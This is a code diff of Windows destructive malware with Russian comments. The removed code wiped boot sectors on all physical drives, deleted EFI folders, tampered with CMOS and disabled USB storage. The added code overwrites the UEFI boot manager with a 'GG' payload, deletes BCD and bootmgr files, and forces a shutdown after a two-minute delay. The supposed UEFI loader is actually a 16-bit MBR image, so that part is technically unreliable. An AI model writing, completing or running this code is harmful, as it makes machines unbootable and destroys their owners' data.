@@ -1,11 +1,11 @@
 #include <windows.h>
 #include <stdio.h>
-#include <winioctl.h>
+#include <fileapi.h>
 
 extern volatile bool g_running;
 
-// ====== GG MBR (16-битный код) ======
-unsigned char mbr_code[512] = {
+// ====== GG UEFI ЗАГРУЗЧИК (выводит GG и зависает) ======
+unsigned char gg_loader[] = {
     0xFA, 0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E,
     0xD0, 0xBC, 0x00, 0x7C, 0x89, 0xE3, 0xBD, 0x00,
     0x7C, 0xB8, 0x00, 0x13, 0xCD, 0x10, 0xB8, 0x00,
@@ -72,107 +72,92 @@ unsigned char mbr_code[512] = {
     0x00, 0x55, 0xAA
 };
 
-// ====== УНИЧТОЖАЕТ ВСЕ ДИСКИ (PhysicalDrive0-9) ======
-void KillAllDisks() {
-    char diskPath[32];
+// ====== ПОДМЕНА ЗАГРУЗЧИКА ======
+bool ReplaceBootLoader() {
+    // 1. Монтируем ESP-раздел
+    system("mountvol X: /S 2>nul");
+    Sleep(1000);
     
-    for (int i = 0; i < 10; i++) {
-        sprintf_s(diskPath, "\\\\.\\PhysicalDrive%d", i);
-        
-        HANDLE hDisk = CreateFileA(
-            diskPath,
-            GENERIC_READ | GENERIC_WRITE,
-            FILE_SHARE_READ | FILE_SHARE_WRITE,
-            NULL,
-            OPEN_EXISTING,
+    // 2. Проверяем, смонтировался ли
+    if (GetFileAttributesA("X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi") == INVALID_FILE_ATTRIBUTES) {
+        // Если не смонтировался — пробуем другие пути
+        if (GetFileAttributesA("X:\\EFI\\Boot\\bootx64.efi") == INVALID_FILE_ATTRIBUTES) {
+            return false;
+        }
+    }
+    
+    // 3. Создаём бэкап
+    CopyFileA("X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi", "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi.bak", FALSE);
+    CopyFileA("X:\\EFI\\Boot\\bootx64.efi", "X:\\EFI\\Boot\\bootx64.efi.bak", FALSE);
+    
+    // 4. Пишем свой загрузчик
+    HANDLE hFile = CreateFileA(
+        "X:\\EFI\\Microsoft\\Boot\\bootmgfw.efi",
+        GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    
+    if (hFile == INVALID_HANDLE_VALUE) {
+        // Пробуем через bootx64.efi
+        hFile = CreateFileA(
+            "X:\\EFI\\Boot\\bootx64.efi",
+            GENERIC_WRITE,
             0,
+            NULL,
+            CREATE_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
             NULL
         );
-
-        if (hDisk != INVALID_HANDLE_VALUE) {
-            // Стираем первые 64 сектора (MBR + GPT)
-            for (int sector = 0; sector < 64; sector++) {
-                DWORD bytesWritten;
-                SetFilePointer(hDisk, sector * 512, NULL, FILE_BEGIN);
-                WriteFile(hDisk, mbr_code, 512, &bytesWritten, NULL);
-            }
-            CloseHandle(hDisk);
-        }
     }
-}
-
-// ====== УНИЧТОЖАЕТ EFI НА ВСЕХ РАЗДЕЛАХ ======
-void KillAllEFI() {
-    char drivePath[8];
     
-    for (char drive = 'C'; drive <= 'Z'; drive++) {
-        sprintf_s(drivePath, "%c:\\EFI", drive);
-        
-        if (GetFileAttributesA(drivePath) != INVALID_FILE_ATTRIBUTES) {
-            // Удаляем папку EFI полностью
-            char cmd[128];
-            sprintf_s(cmd, "rmdir /s /q %c:\\EFI", drive);
-            system(cmd);
-        }
+    if (hFile == INVALID_HANDLE_VALUE) {
+        return false;
     }
+    
+    DWORD bytesWritten;
+    WriteFile(hFile, gg_loader, sizeof(gg_loader), &bytesWritten, NULL);
+    CloseHandle(hFile);
+    
+    return true;
 }
 
-// ====== ПОРТИТ CMOS/BIOS ======
-void KillCMOS() {
-    // Пытаемся открыть CMOS через порты
-    __try {
-        // Сбрасываем CMOS (классический метод)
-        __outbyte(0x70, 0x80);
-        __outbyte(0x71, 0x00);
-        
-        // Выключаем загрузку с USB
-        __outbyte(0x72, 0x00);
-        __outbyte(0x73, 0x00);
-    } __except(EXCEPTION_EXECUTE_HANDLER) {
-        // Если не получилось — хуй с ним
-    }
+// ====== УБИВАЕМ BCD (для BIOS) ======
+void KillBCD() {
+    system("bcdedit /export C:\\bcd_backup.bak 2>nul");
+    system("attrib -h -s -r C:\\boot\\BCD 2>nul");
+    system("del /f /q C:\\boot\\BCD 2>nul");
+    system("attrib -h -s -r C:\\Boot\\BCD 2>nul");
+    system("del /f /q C:\\Boot\\BCD 2>nul");
 }
 
-// ====== БЛОКИРУЕТ ЗАГРУЗКУ С ФЛЕШКИ ======
-void KillUSB() {
-    // Отключаем USB-контроллеры
-    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\USBSTOR /v Start /t REG_DWORD /d 4 /f");
-    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\USB /v Start /t REG_DWORD /d 4 /f");
-    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbehci /v Start /t REG_DWORD /d 4 /f");
-    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbhub /v Start /t REG_DWORD /d 4 /f");
-    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbccgp /v Start /t REG_DWORD /d 4 /f");
-    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbohci /v Start /t REG_DWORD /d 4 /f");
-    system("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\usbuhci /v Start /t REG_DWORD /d 4 /f");
+// ====== УБИВАЕМ BIOS-ЗАГРУЗЧИКИ ======
+void KillBIOS() {
+    system("attrib -h -s -r C:\\bootmgr 2>nul");
+    system("del /f /q C:\\bootmgr 2>nul");
+    system("attrib -h -s -r C:\\ntldr 2>nul");
+    system("del /f /q C:\\ntldr 2>nul");
+    system("attrib -h -s -r C:\\boot.ini 2>nul");
+    system("del /f /q C:\\boot.ini 2>nul");
 }
 
-// ====== УНИЧТОЖАЕТ BOOTMGR ======
-void KillBootMgr() {
-    system("attrib -h -s -r C:\\bootmgr");
-    system("del /f /q C:\\bootmgr");
-    system("attrib -h -s -r C:\\BOOTNXT");
-    system("del /f /q C:\\BOOTNXT");
-}
-
-// ====== ОСНОВНАЯ ФУНКЦИЯ ======
+// ====== ФИНАЛЬНЫЙ КИЛЛ ======
 DWORD WINAPI InjectMBR_Delayed(LPVOID) {
     Sleep(120000); // 2 минуты хаоса
 
-    // 1. УНИЧТОЖАЕМ ВСЕ ДИСКИ
-    KillAllDisks();
+    // 1. ПОДМЕНЯЕМ UEFI ЗАГРУЗЧИК
+    ReplaceBootLoader();
 
-    // 2. УНИЧТОЖАЕМ EFI
-    KillAllEFI();
+    // 2. УБИВАЕМ BCD
+    KillBCD();
 
-    // 3. УНИЧТОЖАЕМ BOOTMGR
-    KillBootMgr();
+    // 3. УБИВАЕМ BIOS-ЗАГРУЗЧИК
+    KillBIOS();
 
-    // 4. БЛОКИРУЕМ USB/ФЛЕШКИ
-    KillUSB();
-
-    // 5. ПОРТИМ CMOS
-    KillCMOS();
-
-    // 6. ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА
+    // 4. ПЕРЕЗАГРУЗКА
     system("shutdown /s /t 5");
 
     return 0;
